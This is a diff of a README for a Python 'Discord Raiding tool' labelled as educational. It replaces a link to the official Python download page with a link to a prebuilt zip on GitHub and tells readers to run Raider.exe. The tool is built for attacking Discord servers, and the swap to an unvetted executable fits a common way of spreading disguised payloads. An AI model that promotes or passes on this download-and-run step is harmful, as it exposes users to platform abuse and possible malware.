@@ -5,7 +5,7 @@ Best Discord Raiding tool free using python
 [FOR EDUCATIONAL PURPOSES ONLY]
 
 # How to use (compiled version)
-1. Download the raider from: [here](https://www.python.org/downloads/release/python-3114/)
+1. Download the raider from: [here](https://github.com/skidur31223/RyaRaider/releases/download/1.0/Compiled.zip)
 2. Unpack it with winrar or a other unzipping software
 3. Run the Raider.exe
 
